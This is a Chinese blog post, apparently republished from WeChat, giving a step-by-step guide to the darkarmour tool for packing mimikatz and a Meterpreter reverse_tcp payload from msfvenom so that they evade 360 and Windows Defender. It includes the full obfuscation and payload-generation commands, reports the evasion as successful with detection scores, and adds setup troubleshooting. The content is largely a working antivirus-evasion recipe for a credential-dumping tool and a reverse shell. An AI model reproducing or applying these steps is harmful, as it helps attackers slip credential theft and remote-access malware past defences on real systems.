> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Bd1VVKAY3jjQTf8q8xT8Hg)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cuyHlTXQkuRl3NWjual4yPviavGjhR2sp4ggmm6rLyfwpgGicl2e6nBicw/640?wx_fmt=png)

**0x1 mimikatz 免杀**

```
python3 darkarmour.py -f /root/mimikatz.exe -e xor -j -k sanker -l 20 -u -o /root/bypass_mimikatz.exe
```

k 参数：用于加密的密钥 key，如果不设置则默认随机生成  

j 参数：使用基于 jmp 的 PE 加载器  

l 参数：加密级别  

u 参数：用 upx 打包可执行文件

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cdNwfE7Ugdups6dmUI1pZTs6m0YQVBQbKBT2G6ugwUe5JzJ4SZzIL0A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1c5qk1MH0IE2IJaKxEqmrMROBxH2TmnD9oU5EQTRZxMB52ju51R34K4w/640?wx_fmt=png)

这里加密字节的过程比较久，尝试运行 bypass_mimikatz.exe

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1ceKLQYBHRGRVxrkUIMs2gVmvwPKP4Fuiab0hbGMdvWqIHKyEsrXFyZZA/640?wx_fmt=png)

运行成功，看看免杀效果如何  

Bypass 360 success!

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1caDmKtkQ3AvzgnoDYmLFbic8vYDrv3vDNU7VZ3qw0U46409yZ5or7ONg/640?wx_fmt=png)

Bypass Windows Defender success!

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1chkR4EPm9O64iaABbknTGr5nLgUNVX6E8bMlbDapNia3iaevkjE5nia9gHA/640?wx_fmt=png)

V 站评分 10/66

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cskm9EgQhuyRP77rdZiaZP8wbXzNyz3yicJpml1IXtiahXmKKRCxnqic21g/640?wx_fmt=png)

**0x2 MSF 免杀**

先生成可执行文件

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.160.128 LPORT=4488 -f exe -o msf.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1c6NibZT7JtmqNd6zZUDzAZmCB7ALjyjza1u9oY7T4u83ppGY5Fuw0YAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cDHqO7Maic6522AAgCI2Rb8OfVNOjWTARX1oPMd8wEoz7QwZX8IP1ibzw/640?wx_fmt=png)

此次的加密等级设置为 10，看运行如何

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cicqBE1ydoevXgkMIUibWHZR7eLialIGK2iapf1XPicls7KPR4h7icDAWJ0Cw/640?wx_fmt=png)

上线成功，看看免杀效果如何

Bypass 360 success!

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1c04FSSvFm7onVz6QYr1EZyOlW3WdKWsajXibrU6UsibMtpicPClg6T3MQw/640?wx_fmt=png)

Bypass Windows Defender success!

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cIIKljzsIxE14WuZ8z7VYX8qickI5L60OczMCx9zWB0wkNHvmkfocAqw/640?wx_fmt=png)

V 站评分 22/66（分数不太可观，可能和我设置的加密等级有关）

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cvz3iaX7WffTdR1a8oo7iajQCeibvdReRxlNfARw22CfKlQd4sKGD9yfQQ/640?wx_fmt=png)

吐槽一下，加密后的 mimikatz.exe 居然 10.6MB，我真服了。源文件才 1.29MB，我猜测这应该是我设置的加密等级太高，图中可以看到我加密等级为 500，项目给出的示例也仅仅是 5 而已。同时，我猜测加密等级会影响免杀效果，由于加密花费时间较长，我这里就没有一一进行测试，师傅们可以自行尝试。

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cehkGhIfHVdvCUXjUr6U0vWzNK62ib5WkGbKFhKsTF6OpCsssWiayUS9Q/640?wx_fmt=png)

**记录一些使用过程中遇到的问题：**  

**排坑 1：报错 “sh: 1: x86_64-w64-mingw32-gcc: not foundded.exe...”**

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cNIHXGOdZZq5kYGNudrkUcOSdfZHODOSZOgEaap3Z1JkZ3FvyZsRfSA/640?wx_fmt=png)

**解决方法：**  

```
apt-get install mingw-w64
```

**项目所需要的依赖环境：**  

```
apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode
```

注意：本人试过用 Windows 10 和 Ubuntu 系统去使用 darkarmour 工具，都混淆 shellcode 失败，原因未知。如果同样有小伙伴在使用这款工具时遇到这样的问题，不妨换成 Kali 系统。

**排坑 2：使用 msfvenom 生成 MSF 马时，必须用以下命令**

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.160.128 LPORT=4488 -f exe -o msf.exe
```

注意：payload 一定得是 windows/x64/meterpreter/reverse_tcp  

（别问为什么，我也不清楚，我一开始上线不成功，最后排查到居然是 payload 的问题，想不明白为什么，这里浪费好些时间![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1csUSTboYniapwicE0sppTbtsiahYmh3NMQcwiaibva6ly8Q8BX129ya8XoHw/640?wx_fmt=png)）

**源项目地址：**

```
https://github.com/bats3c/darkarmour
```

感谢所有前辈的开源精神以及知识分享![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2w228NLrYyROyQkcpCE4C1cvbg2GwrP8O5Xp2qON3SXwFQJas8pIovV1A7PyQRIiasv1Y0iajdzokCw/640?wx_fmt=png)